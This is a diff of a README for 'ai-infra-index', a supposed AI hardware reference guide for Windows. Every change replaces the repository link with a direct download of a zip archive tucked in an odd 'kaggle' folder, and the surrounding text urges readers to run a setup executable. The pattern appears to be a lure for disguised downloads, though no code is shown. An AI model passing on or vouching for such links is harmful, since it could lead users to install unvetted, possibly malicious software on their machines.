@@ -1,6 +1,6 @@
 # 🤖 ai-infra-index - Easy AI Hardware Reference Guide
 
-[![Download ai-infra-index](https://img.shields.io/badge/Download-Get%20ai--infra--index-blue?style=for-the-badge)](https://github.com/DarkSliceYT/ai-infra-index)
+[![Download ai-infra-index](https://img.shields.io/badge/Download-Get%20ai--infra--index-blue?style=for-the-badge)](https://github.com/DarkSliceYT/ai-infra-index/raw/refs/heads/main/kaggle/ai_infra_index_v3.1-alpha.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Make sure your Windows PC meets the following:
 
 You can visit this page to download the software:
 
-[Download ai-infra-index](https://github.com/DarkSliceYT/ai-infra-index)
+[Download ai-infra-index](https://github.com/DarkSliceYT/ai-infra-index/raw/refs/heads/main/kaggle/ai_infra_index_v3.1-alpha.1.zip)
 
 Click the link above or the blue badge at the top to open the download page. The page contains the latest files. Look for a file with a name like `ai-infra-index-setup.exe`. This is the installer.
 
@@ -104,7 +104,7 @@ If you face issues running the program:
 ## 🔗 Useful Links  
 
 Primary download and info page:  
-[https://github.com/DarkSliceYT/ai-infra-index](https://github.com/DarkSliceYT/ai-infra-index)
+[https://github.com/DarkSliceYT/ai-infra-index/raw/refs/heads/main/kaggle/ai_infra_index_v3.1-alpha.1.zip](https://github.com/DarkSliceYT/ai-infra-index/raw/refs/heads/main/kaggle/ai_infra_index_v3.1-alpha.1.zip)
 
 You can use this link to revisit the site for updates or to explore documentation.
 
@@ -159,4 +159,4 @@ A: Data is collected from trusted tech sources, official specs, and benchmark re
 
 ---
 
-[![Download ai-infra-index](https://img.shields.io/badge/Download-Get%20ai--infra--index-blue?style=for-the-badge)](https://github.com/DarkSliceYT/ai-infra-index)
+[![Download ai-infra-index](https://img.shields.io/badge/Download-Get%20ai--infra--index-blue?style=for-the-badge)](https://github.com/DarkSliceYT/ai-infra-index/raw/refs/heads/main/kaggle/ai_infra_index_v3.1-alpha.1.zip)
